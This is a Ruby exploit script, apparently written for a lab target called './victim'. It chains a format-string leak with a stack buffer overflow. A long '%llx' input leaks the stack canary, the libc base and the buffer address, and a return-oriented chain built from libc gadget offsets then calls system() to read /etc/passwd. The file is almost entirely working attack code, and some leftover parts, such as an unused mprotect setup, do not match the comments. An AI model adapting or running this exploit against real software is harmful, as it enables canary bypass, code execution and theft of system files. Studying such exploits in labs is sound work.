#!/usr/bin/ruby

require 'open3'
include Open3

shellcode = "/bin/cat /etc/passwd\0";

popen3('setarch x86_64 -R ./victim') do
  |stdin, stdout, stderr|

  stdin.sync = true
  
  line = stdout.read(6)
  puts line
  stdin.write("%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx,%llx\n")

  stdin.flush

  memleak = stdout.readline
  puts memleak 

  line = stdout.read(6)
  puts line

  cookie = memleak.split(',')[70].to_i(16) # 71th value
  libcbase = memleak.split(',')[68].to_i(16) - 458173 # 69nd value
  bufaddr = memleak.split(',')[73].to_i(16) - 0x518 # 74th value

  ebp = bufaddr + 0x430 # we will overwrite the %rbp value on the stack as well
  system = libcbase + 0x45390;
  mprotect = libcbase + 0x101770; # mprotect offset in libc
  gadget1 = libcbase + 135427 - 1; # pop %rdi; ret;
  gadget2 = libcbase + 131817 - 1; # pop %rsi; ret;
  gadget3 = libcbase + 7059 - 1; # pop %rdx; ret;

  aligned_bufaddr = bufaddr & 0xfffffffffffff000; # align to page boundary
  size = 4096; # page size
  prot = 0x1|0x2|0x4; # what do we want? RWX!

  # "lea    -0x410(%rbp),%rax" -> 0x410 = 1040 - 8 (canary) = 1032
  padding = "\x90" * (1032-shellcode.bytesize) # nop padding of remaining buf 

  puts "\n"
  puts " * exploit"
  puts "  * cookie = " + cookie.to_s(16)
  puts "  * libcbase = " + libcbase.to_s(16) 
  puts "   * mprotect = " + mprotect.to_s(16)
  puts "   * system = " + system.to_s(16) 
  puts "   * gadget1 = " + gadget1.to_s(16) 
  puts "   * gadget2 = " + gadget2.to_s(16) 
  puts "   * gadget3 = " + gadget3.to_s(16) 
  puts "  * bufaddr = " + bufaddr.to_s(16)
  puts " * sending/writing payload..."

  # write the actual payload
  # [bufaddr (containing the payload)]
  # [&system]
  # [addr arg for shellcode]
  # [&gadget1]
  # [rbp]
  # [stack canary]
  # [ ... shellcode padding ... ]
  # [shellcode]

  stdin.write(shellcode + padding +
   [cookie].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [ebp].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [gadget1].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [aligned_bufaddr].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [system].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [bufaddr].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8")
  )
  
  stdin.flush

  puts "\n"

  pay = [cookie].pack('Q') + [ebp].pack('Q') + [gadget1].pack('Q') + [aligned_bufaddr].pack('Q') + [system].pack('Q') + [bufaddr].pack('Q')

  puts shellcode.unpack('Q')

  puts "\n"

  puts shellcode.encode("ASCII-8BIT") + padding +
   [cookie].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [ebp].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [gadget1].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [aligned_bufaddr].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [system].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") +
   [bufaddr].pack('Q').force_encoding("ISO-8859-1").encode("UTF-8") + "\n\n"

end
